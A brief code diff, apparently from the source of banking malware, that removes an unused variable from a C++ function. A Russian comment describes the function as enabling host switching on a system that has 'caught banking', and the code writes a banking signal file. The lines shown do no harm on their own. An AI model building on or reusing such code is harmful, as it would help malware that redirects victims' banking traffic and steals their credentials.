@@ -654,9 +654,6 @@ void Hosts::SetBankingMode()
 {
 	//  Функция включает использования хостов для системы которая
 	//  поймала банкинг
-
-	bool Update = false;
-
 	PCHAR FileName = HostsGetBankingSignalFile();
 
 	File::WriteBufferA(FileName, NULL, 0);
